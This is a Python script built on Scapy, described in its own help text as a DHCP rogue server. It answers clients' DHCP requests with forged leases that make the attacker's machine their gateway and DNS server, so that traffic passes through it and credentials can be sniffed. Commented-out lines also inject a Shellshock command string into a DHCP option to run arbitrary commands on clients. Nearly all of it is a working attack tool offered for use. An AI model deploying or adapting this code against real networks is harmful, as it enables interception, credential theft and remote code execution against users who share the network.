#!/bin/python3

import argparse
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, getmacbyip


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class DHCPListener:
    # Real router
    __GATEWAY_IP: str
    __GATEWAY_MAC: str

    # My DHCP server
    __DHCPServerIp: str
    __DHCPMac: str
    __dictIPS: dict
    __IPPool: list

    # DHCP configuration
    __fakeDNSServer: str
    __fakeSubnetMask: str
    __fakeGatewayIP: str
    __leaseTime: int
    __renewalTime: int
    __rebindingTime: int

    # ShellShock
    _command: str

    def __init__(self):
        self.__GATEWAY_IP = conf.route.route("0.0.0.0")[2]
        self.__GATEWAY_MAC = getmacbyip(self.__GATEWAY_IP)

        self.__DHCPServerIp = get_if_addr(conf.iface)
        self.__DHCPMac = Ether().src
        self.__dictIPS = {}
        self.__IPPool = []

        self.__fakeDNSServer = "8.8.8.8"
        self.__fakeSubnetMask = ""
        self.__fakeGatewayIP = self.__DHCPServerIp
        self.__leaseTime = 86400
        self.__renewalTime = 172800
        self.__rebindingTime = 138240

        self.__command = ""


    def setLeaseTime(self, leaseTime):
        self.__leaseTime = leaseTime

    def setRenewalTime(self, renewalTime):
        self.__renewalTime = renewalTime

    def setRebindingTime(self, rebindingTime):
        self.__rebindingTime = rebindingTime

    def setDNS(self, dns):
        self.__fakeDNSServer = dns

    def setSubnetMask(self, subnetmask):
        self.__fakeSubnetMask = subnetmask

    def setGatewayIP(self, gateway):
        self.__fakeGatewayIP = gateway

    def setIPPool(self, IPPool):
        self.__IPPool = self.getIPPoolbyRange(IPPool)

    def setCommand(self, command):
        self.__command = command

    # Return a list of IP address given a range
    def getIPPoolbyRange(self, iprange):
        return self.returnRange(iprange)

    @staticmethod
    def getIpRangeIterator(iprange):
        l: list = iprange.split(".")
        l.remove(l[len(l) - 1])
        ip = ""
        for i in l:
            ip += str(i) + "."
        return ip

    # Remove last number of an IP address. Ex: For 192.168.0.100 return 192.168.0.
    def returnRange(self, iprange):
        listIP = iprange.split("-")
        maxIP = self.getIpRangeIterator(listIP[0])
        listIP[1] = maxIP + listIP[1]
        return self.generateList(listIP)

    def generateList(self, listIP):
        newList = []
        i = int(listIP[0].split(".")[3])
        n = int(listIP[1].split(".")[3])
        index = self.getIpRangeIterator(listIP[0])

        for x in range(i, n + 1):
            newList.append(index + str(x))
        return newList

    # Decode bytes in option to ascii
    @staticmethod
    def getOption(dhcp_options, key):
        must_decode = ['hostname', 'domain', 'vendor_class_id']
        try:
            for i in dhcp_options:
                if i[0] == key:
                    # If DHCP Server Returned multiple name servers
                    # return all as comma seperated string.
                    if key == 'name_server' and len(i) > 2:
                        return ",".join(i[1:])
                    # domain and hostname are binary strings,
                    # decode to unicode string before returning
                    elif key in must_decode:
                        return i[1].decode()
                    else:
                        return i[1]
        except:
            pass

    # return a DHCP packet for the client discovery
    def generatePacketServerOffer(self, type, IPClient, packet):
        return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2,
                      yiaddr=IPClient,
                      ciaddr=packet[IP].src,
                      siaddr=self.__DHCPServerIp,
                      chaddr=packet[Ether].chaddr,
                      xid=packet[BOOTP].xid) /
                DHCP(options=[
                    ('server_id', self.__DHCPServerIp),
                    ("lease_time", self.__leaseTime), 
                    ('renewal_time', self.__renewalTime),
                    ('rebinding_time', self.__rebindingTime),
                    ('subnet_mask', self.__fakeSubnetMask),
                    ('router', self.__fakeGatewayIP),
                    ('message-type', type),
                    ("name_server", self.__fakeDNSServer),
                    'end']
                ))

    # return a DHCP packet for the client request. 
    def generatePacketServerACK(self, type, IPClient, packet):
        return (Ether(src=self.__DHCPMac, dst=packet[Ether].src) /
                IP(src=self.__DHCPServerIp, dst="255.255.255.255") /
                UDP(sport=67, dport=68) /
                BOOTP(op=2,
                      yiaddr=IPClient,
                      ciaddr=packet[IP].src,
                      siaddr=self.__DHCPServerIp,
                      chaddr=packet[Ether].chaddr,
                      xid=packet[BOOTP].xid) /
                DHCP(options=[
                    ('server_id', self.__DHCPServerIp),
                    ("lease_time", self.__leaseTime), 
                    ('renewal_time', self.__renewalTime),
                    ('rebinding_time', self.__rebindingTime),
                    ('subnet_mask', self.__fakeSubnetMask),
                    ('router', self.__fakeGatewayIP),
                    ('message-type', type),
                    ("name_server", self.__fakeDNSServer),
                    #(114, "() { ignored;}; " + self.__command),
                    #(114, "() { :;}; " + self.__command),
                    'end']
                ))

    # Listening to dhcp packet
    def listener(self, packet):
        # DHCP discover
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            # send DHCP offer
            if len(self.__IPPool) > 0:
                IPClient = self.__IPPool.pop()
                offer = self.generatePacketServerOffer("offer", IPClient, packet)
                sendp(offer)

            print(f'{bcolors.OKBLUE}---New DHCP Discover---{bcolors.ENDC}')
            hostname = self.getOption(packet[DHCP].options, 'hostname')
            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Host {bcolors.WARNING}{hostname}{bcolors.ENDC} "
                  f"({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}) asked for an IP\n")

        # DHCP request
        if DHCP in packet and packet[DHCP].options[0][1] == 3:
            # send DHCP ack
            requestedIP = self.getOption(packet[DHCP].options, 'requested_addr')
            ack = self.generatePacketServerACK("ack", requestedIP, packet)
            sendp(ack)

            print(f"{bcolors.OKBLUE}---New DHCP Request---{bcolors.ENDC}")
            hostname = self.getOption(packet[DHCP].options, 'hostname')
            print(f"{bcolors.FAIL}[*]{bcolors.ENDC} Device {bcolors.WARNING}{hostname}{bcolors.ENDC} "
                  f"({bcolors.WARNING}{packet[Ether].src}{bcolors.ENDC}){bcolors.ENDC} requested {bcolors.WARNING}{requestedIP}\n")
            self.__dictIPS[requestedIP] = packet[Ether].src
            print(f"{bcolors.ENDC}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="This script is a DHCP rogue server.")
    parser.add_argument("-i", "--interface", required=False)
    parser.add_argument("-d", "--dns", required=False, help="DNS IP")
    parser.add_argument("-m", "--netmask", required=True)
    parser.add_argument("-g", "--gateway", required=False,
                        help="Gateway IP for your attack (the IP in which you are going to sniff credentials). "
                             "Default is the same IP"
                             " that your DHCP server")
    parser.add_argument("-x", "--iprange", required=False,
                        help="Range IP Ex: 192.168.0.1-45 ")
    parser.add_argument("-l", "--leasetime", required=False)
    parser.add_argument("-r", "--renewaltime", required=False)
    parser.add_argument("-b", "--rebindingtime", required=False)
    parser.add_argument("-c", "--command", required=False)
    args = parser.parse_args()

    DHCPListener = DHCPListener()
    if args.dns is not None:
        DHCPListener.setDNS(args.dns)
    if args.gateway is not None:
        DHCPListener.setGatewayIP(args.gateway)
    DHCPListener.setSubnetMask(args.netmask)
    if args.iprange is not None:
        DHCPListener.setIPPool(args.iprange)
    if args.leasetime is not None:
        DHCPListener.setLeaseTime(args.leasetime)
    if args.renewaltime is not None:
        DHCPListener.setRenewalTime(args.renewaltime)
    if args.rebindingtime is not None:
        DHCPListener.setRebindingTime(args.rebindingtime)
    if args.command is not None:
        DHCPListener.setCommand(args.command)

    print("DHCP server in listening...")
    if args.interface is None:
        sniff(filter="udp and port 67", prn=DHCPListener.listener)
    else:
        sniff(iface=args.interface, filter="udp and port 67", prn=DHCPListener.listener)

